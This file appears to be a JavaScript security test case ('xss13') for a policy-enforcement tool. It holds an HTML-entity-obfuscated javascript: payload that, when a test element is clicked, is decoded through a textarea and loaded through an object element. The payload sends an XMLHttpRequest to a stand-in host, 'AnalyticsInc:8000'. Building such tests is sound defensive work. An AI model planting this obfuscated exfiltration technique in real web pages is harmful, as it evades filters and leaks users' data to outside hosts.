// exfil_test_xss13.js
function exfiltrate_key_history() {
  var enc = "&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x46;&#x75;&#x6E;&#x63;&#x74;&#x69;&#x6F;&#x6E;&#x28;&#x27;&#x78;&#x6D;&#x6C;&#x68;&#x74;&#x74;&#x70;&#x3D;&#x6E;&#x65;&#x77;&#x20;&#x58;&#x4D;&#x4C;&#x48;&#x74;&#x74;&#x70;&#x52;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x28;&#x29;&#x3B;&#x78;&#x6D;&#x6C;&#x68;&#x74;&#x74;&#x70;&#x2E;&#x6F;&#x70;&#x65;&#x6E;&#x28;&#x22;&#x47;&#x45;&#x54;&#x22;&#x2C;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x41;&#x6E;&#x61;&#x6C;&#x79;&#x74;&#x69;&#x63;&#x73;&#x49;&#x6E;&#x63;&#x3A;&#x38;&#x30;&#x30;&#x30;&#x2F;&#x73;&#x75;&#x62;&#x6D;&#x69;&#x73;&#x73;&#x69;&#x6F;&#x6E;&#x2E;&#x68;&#x74;&#x6D;&#x6C;&#x3F;&#x74;&#x65;&#x73;&#x74;&#x3D;&#x78;&#x73;&#x73;&#x31;&#x33;&#x22;&#x2C;&#x74;&#x72;&#x75;&#x65;&#x29;&#x3B;&#x78;&#x6D;&#x6C;&#x68;&#x74;&#x74;&#x70;&#x2E;&#x73;&#x65;&#x6E;&#x64;&#x28;&#x6E;&#x75;&#x6C;&#x6C;&#x29;&#x3B;&#x27;&#x29;&#x28;&#x29;";
  var bounce = document.createElement("textarea");
  JAM.set(bounce, "innerHTML", enc);
  var script = document.createElement("object");
  script.data = bounce.value;
  var v0 = document.getElementsByTagName("body")[0];
  JAM.call(v0.appendChild, v0, [script]);
  return;
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history)

